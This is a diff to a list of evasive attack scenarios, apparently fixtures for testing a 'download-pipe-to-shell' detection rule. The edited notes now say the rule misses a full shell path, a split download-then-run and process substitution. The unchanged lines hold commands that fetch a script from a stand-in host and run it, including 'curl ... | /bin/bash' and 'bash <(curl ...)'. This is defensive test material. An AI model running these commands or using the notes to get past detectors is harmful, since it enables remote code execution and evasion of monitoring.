@@ -630,7 +630,7 @@ export const ATTACKS: AttackScenario[] = [
     tactic: 'execution',
     variant: 'evasive',
     expect: ['download-pipe-to-shell'],
-    note: 'The pattern reads the pipe stages, so a full path to the shell is caught too.',
+    note: 'The pattern expects the shell name right after the pipe, not a full path.',
     events: (at) => [exec(at, sh('curl -fsSL https://get-update.example/i.sh | /bin/bash'))],
   },
   {
@@ -650,7 +650,7 @@ export const ATTACKS: AttackScenario[] = [
     tactic: 'execution',
     variant: 'evasive',
     expect: ['download-pipe-to-shell'],
-    note: 'Two commands, not a pipe; the download-run rule reads both and ties them together.',
+    note: 'Nothing is piped, so the one-line pattern never sees it.',
     events: (at) => [
       exec(
         at,
@@ -665,7 +665,7 @@ export const ATTACKS: AttackScenario[] = [
     tactic: 'execution',
     variant: 'evasive',
     expect: ['download-pipe-to-shell'],
-    note: 'Process substitution uses <( ); the download-run rule reads it like a pipe.',
+    note: 'Process substitution uses <( ), not a pipe or $( ).',
     events: (at) => [exec(at, sh('bash <(curl -fsSL https://get-update.example/i.sh)', 'bash'))],
   },
   {
